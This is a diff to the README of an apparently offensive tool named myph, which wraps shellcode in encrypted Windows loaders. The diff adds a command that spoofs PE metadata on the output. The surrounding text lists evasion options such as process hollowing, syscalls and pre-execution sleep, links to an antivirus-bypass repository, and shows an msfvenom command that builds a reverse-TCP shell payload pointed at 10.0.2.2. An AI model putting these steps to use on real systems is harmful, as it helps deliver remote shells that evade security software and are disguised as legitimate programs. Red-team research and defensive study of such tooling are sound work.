@@ -41,6 +41,12 @@ go install github.com/cmepw/myph@latest
 ```bash
 Usage:
   myph [flags]
+  myph [command]
+
+Available Commands:
+  completion  Generate the autocompletion script for the specified shell
+  help        Help about any command
+  spoof       spoof PE metadata using versioninfo
 
 Flags:
   -e, --encryption encKind   encryption method. (allowed: AES, chacha20, XOR, blowfish) (default AES)
@@ -52,6 +58,8 @@ Flags:
       --sleep-time uint      sleep time in seconds before executing loader (default: 0)
   -t, --technique string     shellcode-loading technique (allowed: CRT, ProcessHollowing, CreateThread, Syscall) (default "CRT")
   -v, --version              version for myph
+
+Use "myph [command] --help" for more information about a command.
 ```
 
 #### Loader Methods
@@ -65,7 +73,7 @@ This tool supports few methods for now, but aims to add more as time goes on:
 If you don't know what that is about, go check out [this repository](https://github.com/CMEPW/BypassAV) :)~
 
 
-#### Example
+#### Example run
 
 Generate a payload like so:
 
@@ -78,6 +86,9 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.2.2 LPORT=1234 -f raw -o ms
 
 # you should find your payload here
 file ./something.exe
+
+# add some program metada
+./myph spoof --pe something.exe --file .github/test-data/example.json
 ```
 
 #### Using docker
